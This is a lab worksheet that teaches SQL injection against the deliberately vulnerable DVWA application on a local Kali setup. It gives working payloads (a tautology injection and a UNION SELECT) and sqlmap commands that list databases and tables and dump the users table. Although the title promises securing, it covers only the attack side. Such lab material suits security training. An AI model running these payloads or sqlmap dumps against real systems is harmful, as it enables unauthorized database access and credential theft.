# Project 7: Exploiting and Securing a Database using SQL Injection on DVWA

## Introduction
In this project, you will learn how to exploit SQL injection vulnerabilities using the Damn Vulnerable Web Application (DVWA) on Kali Linux. SQL injection is a common attack vector that can be used to manipulate databases and extract sensitive information. By the end of this project, you will be able to identify and exploit SQL injection vulnerabilities and understand how to secure databases against such attacks.

## Pre-requisites
- Basic understanding of web application and database concepts.
- Familiarity with using the command line interface (CLI).
- Basic knowledge of SQL and web security principles.

## Lab Set-up and Tools

### Diagram
Here is a simple network diagram for this lab setup:

+------------------+ +------------------+
| Attacker | | Vulnerable Web |
| Kali Machine |<----->| Application |
| (192.168.1.100) | | (DVWA) |
+------------------+ | (192.168.1.101) |
+------------------+


### Tools
- **Kali Linux**: A Debian-derived Linux distribution designed for digital forensics and penetration testing.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately vulnerable web application.
- **MySQL**: Database management system used by DVWA.
- **Burp Suite**: An integrated platform for performing security testing of web applications (pre-installed on Kali Linux).

### Installation
#### DVWA
1. Clone the DVWA repository:
```sh
git clone https://github.com/digininja/DVWA
```
2. Navigate to the DVWA directory and copy the configuration file:
```
cd DVWA
cp config/config.inc.php.dist config/config.inc.php
```
3. Start the MySQL service and create a database for DVWA:
```
sudo service mysql start
sudo mysql -u root -p
CREATE DATABASE dvwa;
exit;
```
4. Start the Apache service:
```
sudo service apache2 start
```
5. Open DVWA in your web browser at http://localhost/DVWA/setup.php and click on "Create / Reset Database".

## Tasks

### Task 1: Access DVWA and Set Security Level
Step1: Open DVWA in your web browser at http://localhost/DVWA/login.php.
Step2: Log in with the default credentials (admin/password).
Step3: Navigate to the DVWA Security page and set the security level to "Low".
Expected Output: DVWA security level should be set to "Low", making it vulnerable to SQL injection.

### Task 2: Identify SQL Injection Vulnerability
Step1: Navigate to the SQL Injection page in DVWA.
Step2: In the input field, enter:
```sh
' OR '1'='1
```
Step3: Click "Submit" and observe the results.
Expected Output: The application should return all entries in the database, indicating a successful SQL injection.

### Task 3: Extract Data using SQL Injection
Step1: Modify the SQL injection payload to extract data from the database. For example:
```sh
' UNION SELECT user(), database(), version() --
```
Step2: Click "Submit" and observe the results.
Expected Output: The application should display the database user, name, and version information.

### Task 4: Use SQLMap for Automated SQL Injection
Step1: Open a terminal on your Kali Linux machine.
Step2: Use SQLMap to automate the SQL injection process. Replace http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit with the actual URL:
```sh
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<your-session-id>" --dbs
```
Expected Output: SQLMap should list all databases available on the server.

### Task 5: Extract Tables and Data using SQLMap
Step1: Use SQLMap to extract tables from the target database. Replace dvwa with the target database name:
```sh
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<your-session-id>" -D dvwa --tables
```
Step2: Extract data from a specific table (e.g., users):
```sh
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<your-session-id>" -D dvwa -T users --dump
```
Expected Output: SQLMap should display the contents of the users table.


## Additional Resources
DVWA Documentation
Kali Linux Documentation
OWASP SQL Injection Prevention Cheat Sheet
SQLMap Documentation


This project will help you understand how to exploit SQL injection vulnerabilities and secure databases against such attacks using DVWA on Kali Linux, enhancing your skills in web security and database protection.




   
